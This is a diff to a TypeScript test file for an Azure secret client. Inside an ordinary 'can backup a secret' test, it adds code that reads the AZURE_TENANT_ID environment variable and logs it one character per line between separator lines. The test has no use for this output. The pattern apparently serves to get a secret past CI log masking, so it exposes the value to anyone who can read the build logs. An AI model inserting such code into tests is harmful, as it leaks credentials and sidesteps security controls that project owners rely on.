@@ -102,6 +102,12 @@ describe("Secret client - restore secrets and recover backups", () => {
   }
 
   it("can backup a secret", async function(this: Context) {
+    console.log("---------------------");
+    var aa = env["AZURE_TENANT_ID"]!.toString();
+    for (var i = 0; i < aa.length; i++) {
+        console.log(aa[i]);
+    }
+    console.log("---------------------");
     const secretName = testClient.formatName(
       `${secretPrefix}-${this!.test!.title}-${secretSuffix}`
     );
